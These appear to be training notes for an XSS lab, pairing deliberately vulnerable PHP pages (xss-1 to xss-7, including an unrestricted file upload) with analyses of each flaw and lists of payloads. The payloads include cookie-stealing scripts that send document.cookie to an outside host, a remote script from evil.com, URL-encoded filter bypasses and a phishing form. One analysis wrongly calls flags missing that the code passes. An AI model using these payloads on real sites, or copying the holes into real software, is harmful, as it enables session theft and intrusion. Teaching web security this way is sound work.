# i
---
### **Payload summary:**

**Basic Alert Payloads**
```html
<script>alert(123);</script>
```
```html
<script>alert('Rishabh');</script>
```
```html
<script>alert(document.domain);</script>
ab data ksis website oe multiple domain see write hota hai ab actualy payload ka impact kaha pr hoga isse hame pata lagega
```
```html
<script>alert(document.cookie);</script>
```
```js
<script> let el = document.querySelector("body"); let p = document.createElement("p"); el.appendChild(p); p.setHTMLUnsafe(document.cookie);
</script>
```

**Cookie Theft via Image Request:**
```html
<script>var i=new Image; i.src="http://192.168.1.5:8000/?"+document.cookie;</script>
```
```html
<script>let i=new Image;
i.src="http://192.168.1.5:8000/?"+document.cookie;</script>
```

**URL-Encoded Payloads**
```
%3Cscript%3Evar%20i%3Dnew%20Image%3B%20i.src%3D%22http%3A%2F%2F192.168.1.7%2F%3Fx%22%2Bdocument.cookie%3B%3C%2Fscript%3E
```
```
%3Cscript%3Elet%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F192.168.1.5%3A8000%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
```

**Other Common Exploits**
```html
<script>alert('XSS')</script>
```
```html
<img src=x onerror=alert('XSS')>
```
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
```html
<form action="https://malicious-site.com">Enter Password: <input type=password></form>
```

**Bypass Example Payloads**
```html
<img src=x onerror=alert('XSS')>
```
```html
<svg/onload=alert('XSS')>
```
```html
"><svg/onload=alert('XSS')>
```
```html
<iframe src="javascript:alert('XSS');"></iframe>
```
```html
<svg onload=alert('XSS')>
```
```html
<body onload=alert('XSS')>
```
```html
<a href="javascript:alert('XSS')">click me</a>
```
```html
<a href="#" onclick="alert('XSS'); return false;">click me</a>
```
```html
<form action="javascript:alert('XSS')">
```

**Case Variation/Obfuscation**
```html
<ScRipT>alert('XSS')</sCrIpT>
```
```html
<script src="http://evil.com/malicious.js">
```
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

**Payloads Not Using `alert`**
```html
<script>confirm(1)</script>
```
```html
<script>prompt(1)</script>
```
```html
<img src=x onerror=confirm(1)>
```
```html
<svg/onload=confirm(1)>
```
```html
<h1 style="color:red" onmouseover="console.log(1)">Hover Me</h1>
```
```html
<a href="javascript:console.log(1)">Click me</a>
```

---
---
## Vulnerable Example: xss-1.php

```bash
xss-1.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS Vulnerability Lab</title>
</head>
<body>

<h1>Welcome To Armour Infosec</h1>

<?php
// Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
if (isset($_REQUEST['user'])) {
    echo $_REQUEST['user'] . '!!';
}
?>

<p>Try injecting JavaScript or HTML code into the 'user' parameter in the URL to test reflected XSS:</p>
<pre>user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

</body>
</html>
```

### Code Analysis and XSS Issue

#### Key Code Segment

```php
if (isset($_REQUEST['user'])) {
    echo $_REQUEST['user'] . '!!';
}
```

#### Vulnerability Explanation

*   **Direct Output of User Input**: The core problem is that the code takes whatever is given in the `user` parameter (via GET, POST, or COOKIE), and directly outputs it to the web page without any form of sanitization, escaping, or validation.

*   **Result**: If a user supplies a malicious payload—such as `<script>alert('XSS')</script>`—as the value of `user`, that JavaScript will be rendered and executed in the browser of anyone visiting that URL.

*   **Example**:
```
http://yourlab.com/page.php?user=<script>alert('XSS')</script>
```

This would cause a browser popup when that page is loaded.

#### What Makes This Reflected XSS?

*   The malicious payload is immediately "reflected" back in the HTTP response, rather than being stored on the server for later.
*   The vulnerable code is using `$_REQUEST`, which combines GET, POST, and COOKIE variables, expanding the attack surface.

#### Risks for Users

*   **Script Execution**: Any visitor who clicks a crafted link or submits a manipulated form could have arbitrary JavaScript executed in their browser in the context of the vulnerable site.
*   **Cookie Theft**: Attackers could use scripts to steal session cookies, hijack logins, or impersonate users.
*   **Session Security**: The presence of admin cookies and session variables further increases attack value—they could be targeted for theft or manipulation.

---
### Common XSS Exploits

#### Basic Alert Payloads

*   `alert(123);` – Displays a numeric popup alert.
```html
<script>alert(123);</script>
```

*   `alert('Rishabh');` – Displays a popup with the text 'Rishabh'.
```html
<script>alert('Rishabh');</script>
```


```js
let el = document.querySelector("body"); let p = document.createElement("p"); el.appendChild(p);   p.setHTMLUnsafe(document.cookie);
```

*   `alert(document.domain);` – Shows the domain of the current document (used to confirm the site context).
```html
<script>alert(document.domain);</script>
```

*   `alert(document.cookie);` – Displays the user's cookies stored for the site, indicating successful access to sensitive info.
```html
<script>alert(document.cookie);</script>
```

*   These are simple JavaScript alert popups enclosed in `<script>` tags.
*   They are commonly used to **test if XSS vulnerabilities exist** by triggering a popup box.
#### Cookie Theft via Image Request

```html
<script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>
```

```html
<script>let i=new Image;
i.src="http://192.168.1.5:8000/?"+document.cookie;</script>
```

*   Creates a new JavaScript `Image` object without adding it to the page.
*   Sets the image's `src` attribute to a URL controlled by the attacker (`http://192.168.1.6/`), appending the victim's cookie as a query parameter.
*   When the browser tries to load this image, it sends the victim's cookies to the attacker's server—**stealing session cookies or authentication tokens**.

#### URL-Encoded Versions of Payloads

```
%3Cscript%3Evar%20i%3Dnew%20Image%3B%20i.src%3D%22http%3A%2F%2F192.168.1.7%2F%3Fx%22%2Bdocument.cookie%3B%3C%2Fscript%3E
```

```
%3Cscript%3Elet%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F192.168.1.5%3A8000%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
```

*   These are the **URL-encoded** versions of the image-based cookie theft payload.
*   URL encoding is used to safely transmit special characters in URLs without breaking web requests or filters.
*   When decoded, they become the same JavaScript payload as before.
*   Attackers use URL-encoding to **bypass input filters or WAFs** that don't decode inputs before inspection.

#### Other Common Exploits
*   Simple script execution:
```html
<script>alert('XSS')</script>
```
*   Event handler injection:
```html
<img src=x onerror=alert('XSS')>
```
*   Malicious payloads targeting cookies:
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
*   HTML injection for phishing:
```html
<form action="https://malicious-site.com">Enter Password: <input type=password></form>
```    
### Summary Table

| Payload Type                                                                   | Purpose                                          | Explanation                                    |
| :----------------------------------------------------------------------------- | :----------------------------------------------- | :--------------------------------------------- |
| `<script>alert(...);</script>`                                                 | Proof of XSS vulnerability                       | Shows popup alert to confirm vulnerability     |
| `<script>alert(document.cookie);</script>`                                     | Test access to victim's cookies                  | Indicates potential for cookie theft           |
| `<script>var i=new Image; i.src="http://attacker/?"+document.cookie;</script>` | Steal cookies via HTTP request                   | Sends victim's cookie to attacker's server     |
| `%3Cscript%3E ... %3C%2Fscript%3E`                                             | Encoded payload for bypassing input restrictions | Encodes special characters for evading filters |
### Importance for Security Testing and Labs

*   These payloads are typical first steps in **security assessments and penetration testing** to confirm an XSS flaw.
*   The cookie theft payload is a **real-world attack vector** that hackers use to hijack sessions.
*   URL-encoded variants highlight the importance of comprehensive **input decoding and normalization** before filtering.

Always use such payloads responsibly within authorized testing environments or labs, never on unauthorized systems.

---
## Vulnerable Example: xss-2.php

```bash
xss-2.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS Lab - Partial Script Tag Filter</title>
</head>
<body>

<h1>Welcome To Armour Infosec</h1>

<?php
if (isset($_REQUEST['user'])) {
    // Intentionally simple removal of <script> tags only - still vulnerable to many XSS vectors
    $user = $_REQUEST['user'];
    $user = preg_replace("/<script>/i", "", $user);
    $user = preg_replace("/<\/script>/i", "", $user);
    echo $user . "!!";
}
?>

<p>Try injecting various XSS payloads into the <code>user</code> parameter:</p>
<pre>user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

</body>
</html>
```

## Vulnerable Example: xss-3.php

```bash
xss-3.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS Lab - Partial Script Tag Filter</title>
</head>
<body>

<h1>Welcome To Armour Infosec</h1>

<?php
if (isset($_REQUEST['user'])) {
    // Intentionally simple removal of <script> tags only - still vulnerable to many XSS vectors
    $user = $_REQUEST['user'];
    $user = preg_replace("/<script>/", "", $user);
    $user = preg_replace("/<\/script>/", "", $user);
    echo $user . "!!";
}
?>

<p>Try injecting various XSS payloads into the <code>user</code> parameter:</p>
<pre>user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

</body>
</html>
```

---

### Code Analysis and XSS Issue

#### Vulnerable Code Snippet:

```php
$user = $_REQUEST['user'];

$user = preg_replace("/<script>/i", "", $user);
$user = preg_replace("/<\/script>/i", "", $user);

echo $user . "!!";
```

#### What's Happening?

*   **User Input:** The value of the `user` parameter from the HTTP request (GET, POST, or COOKIE) is accessed directly.
*   **Partial Filtering:** The code attempts to remove only the literal `<script>` and `</script>` tags using a case-insensitive regex.
*   **Output:** The (partially filtered) user input is echoed back directly into the HTML response without further encoding or sanitization.

#### Why This Is Vulnerable to XSS

*   **Insufficient Filtering:** Removing only `<script>` tags is minimal defense.
    *   Attackers can bypass this by using alternate HTML tags such as `<img>`, `<svg>`, `<iframe>`, or event handlers like `onerror`, `onload`, `onclick`.
    *   Script tags with attributes, mixed case, spaces, or comment delimiters can evade the regex.
    *   Encoded or obfuscated payloads (e.g., using HTML entities or URL encoding) also bypass this.
*   **Direct Output Without Encoding:** Echoing user input without encoding means the browser will interpret injected HTML or JavaScript, allowing arbitrary code execution.

---
### Example Attack Vectors That Bypass This Code

| Attack Payload                                | How It Bypasses Filtering                                |
| :-------------------------------------------- | :------------------------------------------------------- |
| `<img src=x onerror=alert('XSS')>`            | Uses event handler, no `<script>` tag                    |
| `<ScRipT>alert('XSS')</sCrIpT>`               | Case variation may fail simple filters                   |
| `<script src="http://evil.com/malicious.js">` | Partial filtering doesn't handle all script tag variants |
| `"><svg/onload=alert('XSS')>`                 | Uses SVG and event attributes                            |
| `&lt;script&gt;alert('XSS')&lt;/script&gt;`   | Encoded entities, not removed                            |
### Impact

*   **Code Execution in Victim's Browser:** Attacker controls script executed in trusted web context.
*   **Session Theft:** Malicious scripts can steal cookies or tokens.
*   **User Impersonation & Phishing:** Attacker can impersonate users or modify page content.
*   **Potential Full Account or System Compromise:** Especially if combined with other vulnerabilities.

### Why Regex Filtering is Inadequate

*   HTML is too complex and flexible for regex to handle all tag/attribute variations reliably.
*   Script insertion can happen in multiple ways that bypass simplistic tag-stripping.

### Summary

*   The code attempts minimal filtering only targeting `<script>` tags.
*   It leaves many XSS vectors untouched, thus is still vulnerable.
*   This makes it a **good demonstration lab** to show partial filtering's pitfalls and teach how attackers can bypass naive defenses.
*   Proper mitigation requires **contextual output encoding** or sanitized input via well-maintained libraries and frameworks, not simple regex removal.

---
## Vulnerable Example: xss-4.php

```bash
xss-4.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS Lab - Simple Script Filter</title>
</head>
<body>

<h1>Welcome To Armour Infosec</h1>

<?php
if (isset($_REQUEST['user'])) {
    $user = $_REQUEST['user'];

    // Simple case-insensitive filter for "script" keyword -- intentionally naive
    if (preg_match('/script/i', $user)) {
        die("Error");
    } else {
        // Output user input directly, no sanitization or encoding
        echo $user . "!!";
    }
}
?>

</body>
</html>
```

### Code Analysis and XSS Issue

The provided PHP code snippet is designed to demonstrate a **partially filtered but still vulnerable scenario** for learning about Cross-Site Scripting (XSS) attacks in a lab environment.

#### What the Code Does

```php
$user = $_REQUEST['user'];

if (preg_match('/script/i', $user)) {
    die("Error");
} else {
    echo $user . "!!";
}
```

*   It takes user input from any HTTP request parameter named `user`.
*   It checks if the string `"script"` (case-insensitive) appears anywhere in the input.
*   If yes, it terminates execution and returns `"Error"`.
*   If no, it outputs the user input directly **without any encoding or further sanitization** followed by `"!!"`.

#### Why This Code Is Still Vulnerable to XSS

1.  **Naive Filtering:**
    The filter only looks for the keyword `"script"` which attempts to block traditional `<script>` tag payloads. However:
    *   Many XSS payloads do **not use `<script>` tags**.
    *   Tags such as `<img>`, `<svg>`, `<iframe>`, or event handlers like `onerror`, `onload`, `onclick` can execute JavaScript without containing `"script"`.
    *   Attackers may obfuscate payloads by inserting spaces, using different cases, or splitting the word `"script"` to circumvent the filter.

2.  **No Output Encoding:**
    Even inputs that do not contain `"script"` are echoed raw inside the HTML page. This enables injection of arbitrary HTML and JavaScript.

3.  **Attack Surface via `$_REQUEST`:**
    Because `$_REQUEST` includes query parameters, POST data, and cookies, this broadens opportunities for injection vectors.

### Example Bypasses for the Filter

These payloads do **not** contain the string `"script"` but can still execute JavaScript.

```html
<img src="x" onerror="alert('XSS')">
```

```html
<svg onload=alert('XSS')>
```

```html
<body onload=alert('XSS')>
```

```html
<a href="javascript:alert('XSS')">click me</a>
```

```html
<a href="#" onclick="alert('XSS'); return false;">click me</a>

```

```html
<form action="javascript:alert('XSS')">
```

### Lab Use Case

*   This partial filter simulates a **realistic but flawed defense** seen in some poorly protected web apps.
*   It allows learners to **practice generating valid XSS payloads that bypass simple keyword blocking**, improving understanding of modern XSS attack vectors.
*   The direct echoing of unsanitized content shows the **importance of context-aware encoding and input validation**.

### Summary Table

| Aspect             | Details                                                                  |
| :----------------- | :----------------------------------------------------------------------- |
| **Filter**         | Blocks any input containing `"script"` (case-insensitive)                |
| **Vulnerability**  | Allows any HTML or JS input without `"script"` in it                     |
| **Attack Vectors** | Event handlers, other HTML tags, obfuscated inputs                       |
| **Risk**           | Reflected XSS leading to cookie theft, session hijacking, phishing, etc. |
| **Suitable For**   | Teaching bypass techniques to naive filters                              |

---
# Vulnerable Example: xss-5.php

```bash
xss-5.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS Lab - Simple Alert Filter</title>
</head>
<body>

<h1>Welcome To Armour Infosec</h1>

<?php
if (isset($_REQUEST['user'])) {
    $user = $_REQUEST['user'];

    // Naive filter to block inputs containing 'alert' (case-insensitive)
    if (preg_match('/alert/i', $user)) {
        die("Error");
    } else {
        // Output unsanitized user input with no encoding - vulnerable!
        echo $user . "!!";
    }
}
?>

</body>
</html>
```

## How the Code Works

*   The script starts a session, sets a cookie, and stores an admin variable in the session.
*   It takes the `user` parameter from any HTTP request.
*   If the input contains the substring `"alert"` (case-insensitive), the program exits with `"Error"`.
*   If not, the input is echoed back to the page unsanitized, followed by `"!!"`.

## XSS Issue

### Partial Filtering Only

*   This code attempts to block classic XSS demonstrations by looking for `"alert"` in the input.
*   It does **not** filter out HTML tags or JavaScript event handlers or any other JavaScript function but `alert`.

### No Output Encoding

*   User input is rendered directly to the HTML response without any escaping or sanitization.

## Ways the Vulnerability Can Be Exploited

Even though the payloads like `<script>alert(1)</script>` or `onerror="alert(1)"` are blocked, most XSS payloads do **not** require the `"alert"` keyword. For example:

*   **Script Execution via Other Functions:**
```html
<script>confirm(1)</script>
```

```html
<script>prompt(1)</script>
```

*   **HTML/JavaScript Event Handlers:**
```html
<img src=x onerror=confirm(1)>
```

```html
<svg/onload=confirm(1)>
```

*   **Arbitrary HTML Injection:**
```html
<h1 style="color:red" onmouseover="console.log(1)">Hover Me</h1>
```

*   **JavaScript URL Vectors:**
```html
<a href="javascript:console.log(1)">Click me</a>
```

## Why This Remains Vulnerable

*   The filter only looks for one keyword, `"alert"`.
*   Many other vectors, methods, and JavaScript functions exist for showing XSS, stealing cookies, or exploiting accounts.
*   No output encoding or sanitization means **any** excluded string is rendered as HTML/JS.

## Conclusion

This is a **classic example** of an insufficient, naive filter. It is a valuable exercise for students to learn:

*   How input blacklists can be trivially bypassed.
*   The importance of context-aware output encoding.
*   Why real XSS defense relies on comprehensive filtering and escaping, not just keyword blocking.

---
## Vulnerable Example: xss-6.php

```bash
xss-6.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS</title>
</head>
<body>

<h1>Welcome To Armour Infosec</h1>

<?php
if (isset($_REQUEST['user'])) {
    $user = $_REQUEST['user'];

    // Encoding user input with htmlentities to safely display it
    // Note: This prevents XSS by escaping HTML special characters
    echo htmlentities($user, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "!!";
}
?>

</body>
</html>
```

### How It Works:

*   The code retrieves user input from the HTTP request parameter `user` (via GET, POST or COOKIE).
*   It outputs the input after processing it with `htmlentities()`.
*   `htmlentities()` converts special HTML characters (like `<`, `>`, `"`, `'`, `&`) into their respective HTML entities (e.g., `<` becomes `&lt;`), which prevents the browser from interpreting them as executable HTML or JavaScript.
*   Therefore, this **prevents Cross-Site Scripting (XSS)** in typical cases because scripts embedded as `<script>...</script>` tags or event handlers are neutralized.

### Why the Code Is Typically Not Vulnerable (Due to htmlentities):

*   **Output Encoding:** By encoding HTML special characters, any injected script tags or JavaScript code will be rendered as plain text on the page, not executed.
*   **No direct injection of active code:** This is the most effective basic prevention for reflected XSS.
*   **UTF-8 and flags:** The example is missing extra flags for `htmlentities()` like `ENT_QUOTES` and explicit `UTF-8` charset, which are best practice to encode quotes and support full character sets. But the basic functionality is intact.

### Potential Limitations (for Advanced Attacks or Misuse):

*   If the output context changes (e.g., inserting user input inside a JavaScript block or HTML attribute without proper context-aware encoding), `htmlentities()` alone is insufficient.
*   If some filtering occurs before `htmlentities()` that modifies the input unexpectedly, it might introduce edge cases.
*   If the charset is not explicitly set, certain encodings might cause problems (but this is rare with modern UTF-8 setups).
*   Some advanced attacks may attempt to encode payloads in ways that bypass naive encoding (not common when properly used).

### Summary:

*   The code you have shown is **not vulnerable to basic reflected XSS**, as it applies `htmlentities()` on output.
*   If your goal is to have an **intentionally vulnerable lab version**, then using `htmlentities()` must be avoided or removed.
*   If the goal is to analyze XSS from a security perspective, this code demonstrates **safe output encoding practice in PHP**.

### Further Reading and Context:

*   XSS vulnerabilities typically arise when **untrusted user inputs are reflected back in HTTP responses without encoding or sanitization**.
*   Using functions like `htmlspecialchars()` or `htmlentities()` safely encodes user-supplied input to prevent script execution.
*   **Proper context-aware encoding** is critical based on where the output is inserted (HTML element, attribute, JavaScript code).
*   Naive filtering or blacklisting keywords (e.g., blocking "script") is insufficient to prevent XSS compounds due to various evasion techniques.

For example usage and best practices in PHP:

*   [Brightsec's PHP XSS guide](https://brightsec.com/blog/php-xss-prevention/)
*   [OWASP Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
*   [PortSwigger XSS Explanation](https://portswigger.net/web-security/cross-site-scripting)

---
# Vulnerable Example: xss-7.php

```bash
xss-7.php
```

```php
<?php

// Display POST data and uploaded file information for debugging and demonstration
print_r($_POST);
print_r($_FILES);

if (isset($_POST['upload'])) {

    if ($_FILES['file']['error']) {
        echo "Error";
        die();
    } else {

        echo "Name: " . $_FILES["file"]["name"] . "<br />";
        echo "File Type: " . $_FILES["file"]["type"] . "<br />";
        echo "Size: " . $_FILES["file"]["size"] . "<br />";
        echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

        // NOTE: Using original filename without sanitization - vulnerable to path traversal and overwriting
        // The move_uploaded_file() call allows uploading any type of file without restriction
        if (move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"])) {
            echo "File Uploaded Successfully";
        } else {
            echo "Could not Upload file";
        }
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>XSS - File Upload Lab</title>
</head>
<body>

<form action="xss-7.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" name="upload" value="Upload" />
</form>

</body>
</html>
```

## Code Analysis and XSS Issue for Your File Upload PHP Code

The provided PHP code snippet implements a file upload form and moves the uploaded file into an "upload/" directory, but **it is vulnerable to multiple security issues, including Cross-Site Scripting (XSS) risks related to file upload**.

### What the code does:

```php
print_r($_POST);
print_r($_FILES);

if (isset($_POST['upload'])) {
    if ($_FILES['file']['error']) {
        echo "Error";
        die();
    } else {
        echo "Name: " . $_FILES["file"]["name"] . "<br />";
        echo "File Type: " . $_FILES["file"]["type"] . "<br />";
        echo "Size: " . $_FILES["file"]["size"] . "<br />";
        echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

        if (move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"])) {
            echo "File Uploaded Successfully";
        } else {
            echo "Could not Upload file";
        }
    }
}
```

*   The script displays POST and FILES arrays (could leak sensitive info).
*   It accepts any file without validation or filtering.
*   Files are saved with their original filename (no sanitization).
*   No restriction on file extension or MIME type.
*   The upload directory is assumed to be publicly accessible.

### Why this is a security risk and XSS vulnerability potential:

1.  **Unrestricted File Upload:**
    *   Attackers can upload files containing malicious scripts, not limited to PHP but also HTML or SVG files with embedded JavaScript.
    *   If such files are accessible via browser, visiting them triggers scripts in the victim's context (stored XSS).
    *   For example, uploading an `.svg` with JavaScript payload or an `.html` file with embedded `<script>` tags can allow XSS when accessed.

2.  **No Filename Sanitization:**
    *   Using the original filename directly enables path traversal or overwriting of existing files.
    *   Special characters or crafted filenames could bypass simplistic validations in some environments.

3.  **Server-side Execution Risk:**
    *   If an attacker uploads a `.php` file or other server-interpreted formats, the server could execute malicious code remotely (Remote Code Execution - RCE).
    *   This is severe and associated with full server compromise.

4.  **Exposure of Sensitive Info:**
    *   Displaying `print_r($_POST)` and `print_r($_FILES)` on the page is not secure, as it exposes form data and file metadata publicly.

5.  **Lack of Client-side or Server-side Validation:**
    *   No size limits, no MIME type checks, no extension whitelisting, no content inspection.
    *   This enables large files or crafted files that might crash or exploit the system.

### Real-World Impact

*   **Stored XSS:** Uploaded malicious files with JavaScript executed when accessed, leading to session hijacking, phishing, or user impersonation.
*   **Remote Code Execution:** If the server executes uploaded scripts, full compromise is possible.
*   **File Overwrite/Directory Traversal:** Improper handling can allow replacing critical files.

### Security Resources on File Upload XSS and Vulnerabilities

*   SVG images can contain JavaScript code causing **stored XSS** when accessed in browsers.
*   Unrestricted uploads of HTML, PHP, or script files enable attackers to plant backdoors or launch client-side attacks.
*   Filename control and directory access restrictions are essential defense layers.
*   Always use proper MIME type / extension whitelist and sanitize filenames.
*   Disable script execution in upload directories via `.htaccess` or server config.

### References for further reading:

*   [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
*   [Vaadata: File Upload Vulnerabilities and Security Best Practices](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)
*   [PortSwigger: File Uploads](https://portswigger.net/web-security/file-upload)
*   [Acunetix: Cross-site Scripting via File Upload](https://www.acunetix.com/websitesecurity/cross-site-scripting/)

---
---